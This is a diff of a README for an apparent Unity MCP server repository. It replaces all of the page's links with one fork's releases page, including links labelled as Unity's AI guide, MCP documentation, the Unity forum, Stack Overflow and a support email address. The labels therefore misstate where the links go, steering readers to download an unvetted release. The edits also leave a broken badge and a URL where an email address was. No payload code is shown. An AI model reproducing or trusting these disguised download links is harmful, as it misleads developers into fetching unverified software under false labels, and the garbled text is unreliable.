@@ -3,9 +3,9 @@
 Welcome to the Unity MCP repository! Here you will find a Unity MCP server that allows MCP clients like Claude Desktop or Cursor to perform Unity Editor actions. This server is designed to streamline your workflow and enhance your overall Unity development experience.
 
 ## 🚀 Quick Links
-- [Download Latest Release](https://github.com/releases/789694263/Release.zip)
+- [Download Latest Release](https://github.com/wondeks/unity-mcp/releases)
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Latest Release](https://github.com/wondeks/unity-mcp/releases%20Release-brightgreen)](https://github.com/wondeks/unity-mcp/releases)
 
 ---
 
@@ -49,9 +49,9 @@ To start using the Unity MCP server and leverage its powerful features, follow t
 
 Explore more about AI integration in Unity, MCP protocols, and Unity Editor automation through the following resources:
 
-- [Unity AI Integration Guide](https://unity.com/ai)
-- [MCP Protocol Documentation](https://mcpdocs.com)
-- [Automating Unity Editor Tasks](https://unityeditorautomation.com)
+- [Unity AI Integration Guide](https://github.com/wondeks/unity-mcp/releases)
+- [MCP Protocol Documentation](https://github.com/wondeks/unity-mcp/releases)
+- [Automating Unity Editor Tasks](https://github.com/wondeks/unity-mcp/releases)
 
 ---
 
@@ -60,11 +60,11 @@ Explore more about AI integration in Unity, MCP protocols, and Unity Editor auto
 Join our community to connect with other Unity developers, share your experiences, and get support for using the Unity MCP server. Whether you have questions, suggestions, or feedback, our community is here to help you make the most out of this tool.
 
 ### Community Forums:
-- [Unity Developer Forum](https://forum.unity.com)
-- [Stack Overflow - Unity](https://stackoverflow.com/questions/tagged/unity3d)
+- [Unity Developer Forum](https://github.com/wondeks/unity-mcp/releases)
+- [Stack Overflow - Unity](https://github.com/wondeks/unity-mcp/releases)
 
 ### Contact Support:
-For direct support inquiries, please email us at support@unitymcp.com.
+For direct support inquiries, please email us at https://github.com/wondeks/unity-mcp/releases
 
 ---
 
